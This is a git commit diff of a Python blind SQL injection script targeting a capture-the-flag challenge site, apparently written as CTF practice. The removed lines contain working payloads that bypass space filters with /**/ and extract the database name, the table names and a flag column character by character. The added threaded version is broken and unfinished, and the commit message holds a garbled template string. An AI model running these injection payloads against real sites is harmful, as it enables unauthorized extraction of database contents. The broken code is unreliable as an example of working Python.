c4f48d86a8fa814585670f1b836569097bea2ea6
whb54012 <1226844928@qq.com>
2026-07-27 08:49:48 +0000

    自动提交：更新 ${2026/7/27 16:49ilenPM49e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -1,21 +1,18 @@
 import requests
+import queue
 import threading
 import warnings
 warnings.filterwarnings("ignore")
 word=""
-num=0
+end=int(input())
+def fun(url):
+    reponse=requests.get(url)
 url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
-for num1 in range(1,57):
-    for num2 in range (20,180):
-        # data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
-        # data = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
-        data = 'ascii(substr((select/**/group_concat(FLAG)/**/from/**/flag)/**/from/**/%d/**/for/**/1))=%d' % (num1, num2)
-        result = requests.get(url + data,verify=False)
-        if "If" in result.text:
-            word+=chr(num2)
-            print(num2)
-
-            print(word)
-            break
-        else:
-            pass
+result1=queue.Queue()
+result2=queue.Queue()
+for i in range(1,end):
+    result1.put(i)
+    result2.put(i)
+for  i in range(1,26):
+    t=threading.Thread(target=fun,args=(url))
+    t.start()
